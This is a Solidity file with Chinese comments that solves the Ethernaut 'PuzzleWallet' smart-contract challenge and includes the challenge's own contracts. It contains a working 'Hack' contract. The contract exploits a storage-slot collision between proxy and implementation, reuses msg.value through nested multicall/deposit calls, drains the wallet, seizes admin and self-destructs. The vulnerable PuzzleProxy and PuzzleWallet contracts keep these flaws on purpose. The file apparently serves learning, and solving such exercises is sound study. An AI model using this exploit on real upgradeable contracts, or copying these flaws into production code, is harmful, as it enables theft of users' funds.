// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

/**
 * ******** 24 PuzzleWallet *******
 * Goal: Become the admin of PuzzleProxy
 *
 * 1、逻辑
 *   - 代理合约掌控 storage
 *   - 漏洞：代理合约和实现合约的状态变量 state variable 的顺序是否一致
 *         - 如果更新了实现合约的第二个变量就会覆盖代理合约的第二个变量
 *         - 如果不使用代理合约模式，而是直接调用实现合约的函数，那么变量顺序就不是一个问题。
 *   - 思路：修改实现合约的 maxBalance 状态变量也就修改了代理合约的 admin
 *         - 要满足的条件： onlywhitelisted, balance == 0;
 *           - 代理合约的 pending Admin -> 实现合约的 owner -> addToWhitelist -> setMaxBalance -> 代理合约的 admin
 *              - 其中 setMaxBalance 的条件是 balance == 0
 * 2、 两个合约：
 *   1） PuzzleProxy是一个升级代理合约：用于管理合约的升级和管理员权限。代理合约通过继承UpgradeableProxy合约来实现升级功能;使用存储 storage
 *   2） PuzzleWallet是一个钱包合约：实现合约
 * 2.2 代理合约：代理合约的逻辑和状态被分为两部分：代理合约和实现合约。
 *   1）代理合约是用户与之交互的合约，通常包含了合约的外部接口和一些管理逻辑，比如权限控制和升级逻辑。
 *      - 代理合约可以在不中断用户交互的情况下升级实现合约。当需要升级合约时，新的实现合约可以部署，并由代理合约引用。
 *   2）实现合约是代理合约的实际逻辑和功能的实现。实现合约可以根据需要进行升级和改进，而不会影响代理合约的外部接口和用户交互。
 *   3）代理合约引用实现合约：
 *      - 使用合约地址来创建合约实例。这样，我们就可以在一个合约中访问另一个合约的功能和状态。
 *      - 在PuzzleProxy合约中，我们可以声明一个PuzzleWallet类型的变量，并在构造函数中将PuzzleWallet合约的地址传递给它。这样，我们就创建了一个指向PuzzleWallet合约的引用。
 *
 * 3. 操作：
 *   1）创建 Hack 合约： 需要接口，因为不复制代理合约和实现合约
 *   2）部署 Hack 合约： msg.value = 0.001 ether（构造函数是 payable ）, 用 PuzzleWallet 合约的 address 来部署 Hack 合约
 *
 */

// 不复制代理合约和实现合约的代码 ---> 用接口
interface IWallet {
    function admin() external view returns (address);

    function proposeNewAdmin(address _newAdmin) external;

    function addToWhitelist(address addr) external;

    function deposit() external payable;

    function multicall(bytes[] calldata data) external payable;

    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable;

    function setMaxBalance(uint256 _maxBalance) external;
}

contract Hack {
    constructor(IWallet wallet) payable {
        // get whitelisted
        // 代理合约设置 pending admin 也就设置了实现合约的 owner
        wallet.proposeNewAdmin(address(this));
        wallet.addToWhitelist(address(this));

        // 设置实现合约的 setMaxBalance 也就设置了代理合约的 admin： 但先要满足条件 address(this).balance == 0
        // 使增加的余额>发送的金额：发送一次 msg.value,但多次调用 deposit（多次 delegatecall）：使balance = 0.002 但是 msg.value = 1;
        // multicall
        // 1. deposit
        // 2. multicall
        // .........deposit

        // 1) 调用 deposit 的数据
        // 创建了一个长度为 1 (包含一个元素)的 bytes 数组
        bytes[] memory deposit_data = new bytes[](1);
        // 第一个参数 wallet.deposit.selector 是一个函数选择器，表示要调用的函数。函数选择器是根据函数的名称和参数类型生成的一个唯一标识符。:.selector 在函数名后面使用,用于获取函数的选择器（selector）；第二个参数没有，如果有就是函数选择器的参数
        deposit_data[0] = abi.encodeWithSelector(wallet.deposit.selector);

        // 2）调用 multicall 的数据： deposit 和multicall 也就是两个元素的 bytes 数组
        bytes[] memory data = new bytes[](2);
        data[0] = deposit_data[0];
        data[1] = abi.encodeWithSelector(
            wallet.multicall.selector,
            deposit_data
        );
        // 使 balance = 0: msg.value = 0.001 ether, 但是可以取出 0.002 ether, “"传入函数的 data 不重要所以可以为空
        wallet.multicall{value: 0.001 ether}(data);
        wallet.execute(msg.sender, 0.002 ether, "");
        // setMaxBalance 也就设置了 代理合约的 admin
        wallet.setMaxBalance(uint256(uint160(msg.sender)));

        require(wallet.admin() == msg.sender, "hack failed");

        selfdestruct(payable(msg.sender));
    }
}

import "../helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    // PuzzleProxy 合约的待定管理员和当前管理员
    address public pendingAdmin;
    address public admin;

    // 构造函数的三个参数，分别是管理员地址、实现合约地址和初始化数据。它还调用了父合约UpgradeableProxy的构造函数。
    constructor(
        address _admin,
        address _implementation,
        bytes memory _initData
    ) UpgradeableProxy(_implementation, _initData) {
        admin = _admin;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    // 用于提议新的管理员并，将其存储在pendingAdmin变量中
    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    // 用于批准新的管理员：如果pendingAdmin等于_expectedAdmin，则将pendingAdmin的值赋给admin，即更新管理员。
    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(
            pendingAdmin == _expectedAdmin,
            "Expected new admin by the current admin is not the pending admin"
        );
        admin = pendingAdmin;
    }

    // 调用了父合约的_upgradeTo函数，用于将合约升级到新的实现合约。
    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    // 设置最大余额和所有者地址
    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    // setMaxBalance 函数用于设置最大余额，但只有在合约余额为0时才能调用
    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    // 将地址添加到白名单中，但只有合约所有者才能调用。
    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    // deposit函数用于向合约存款，合约余额不能超过最大余额。
    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    // 取钱：并从调用者的余额中扣除相应的金额。
    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    // 用于批量执行函数调用，其中包括deposit函数。注意，deposit函数只能调用一次，以防止重复使用msg.value。
    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                // 使用汇编代码获取_data的前32个字节，将其解析为一个函数选择器（selector）
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                // 相等，则表示调用了名为deposit的函数
                // 检查depositCalled变量是否为false
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                // 为了防止重复使用msg.value（函数调用时传入的以太币的数量），将depositCalled设置为true。
                depositCalled = true;
            }
            /**
             * .....delegate .......delegatecall
             * 使用多个 delegatecall 会preserve context: 如果执行 C 的代码，哪些状态变量会更新，msg.value 和 msg.sender 是什么； ----更新调用者的状态变量和保留调用者的上下文（msg.value,和msg.sender）
             *      - A delegatecall b 时，执行的是 B 的代码，但是更新的是 A 的状态变量；同理 B delegatecall C 时，执行的是 C 的代码，但是更新的是 B 的状态变量
             *      - 但是 B 的状态变量 point back to A，所以多个 delegatecall 最后会更新 A 的状态变量（保留 A 的上下文）；
             *          - 比如 msg.value 一直是 1 ETH；
             * 1)   send 1 ETH
             *    user  ->  A - delegatecall -> B - delegatecall -> C
             *    ------------------------------------- 都是 msg.value = 1 ETH
             * 2) 使增加的余额>发送的金额：发送一次 msg.value,但多次调用 deposit（多次 delegatecall）：使balance = 0.002 但是 msg.value = 1;
             *    - 第一次 multicall -> 调用 deposit
             *    - 第二次 multicall -> store one call to deposit
             *    - 因为每次调用 multicall 都会更新 depositCall，
             */

            // proxy -> implementation -> delegatecall
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
